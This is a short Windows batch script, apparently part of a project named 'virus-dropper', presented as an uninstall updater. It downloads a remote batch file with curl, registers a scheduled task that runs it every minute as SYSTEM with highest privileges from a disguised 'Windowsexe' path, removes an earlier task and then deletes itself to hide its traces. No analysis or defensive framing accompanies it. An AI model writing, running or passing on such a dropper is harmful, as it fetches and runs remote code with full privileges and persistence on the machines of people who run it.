curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Uninstall.bat" --output "uninstall.bat"
SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\uninstall.bat" /TN "uninstallTEMP" /RL HIGHEST /RU SYSTEM
powershell -Command "Unregister-ScheduledTask -TaskName 'updateTEMP' -Confirm:$false"
call :deleteSelf&exit
:deleteSelf
start /b "" cmd /c del "%~f0"&exit
